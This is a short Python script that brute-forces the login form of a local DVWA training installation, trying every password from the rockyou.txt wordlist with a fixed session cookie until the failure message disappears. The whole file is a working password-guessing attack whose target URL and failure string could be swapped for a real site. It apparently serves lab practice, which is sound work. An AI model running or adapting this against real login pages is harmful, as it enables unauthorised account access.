import requests
from bs4 import BeautifulSoup

file_name = 'rockyou.txt'
url = "http://localhost/dvwa/vulnerabilities/brute/"
username = '1337'
session = requests.Session()
cookies = {
    'PHPSESSID': 'hih5gnm5pi63if0i56qdgjkrio',
    'security': 'low',
}

def checkResponse(response):
    content = BeautifulSoup(response.text, 'html.parser')
    return False if content.find(string="Username and/or password incorrect.") else True

if __name__ == "__main__":
    with open(file_name) as fh:
        for password in fh:
            password = password.strip()

            payload = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }

            print(f"Trying password {password}")
            response = session.get(url, params=payload, cookies=cookies)

            isSuccessful = checkResponse(response)
            if isSuccessful:
                print(f"\tFound password: {password}")
                break

        if not isSuccessful:
            print("Brute-force attack failed. No matching passwords in the list.")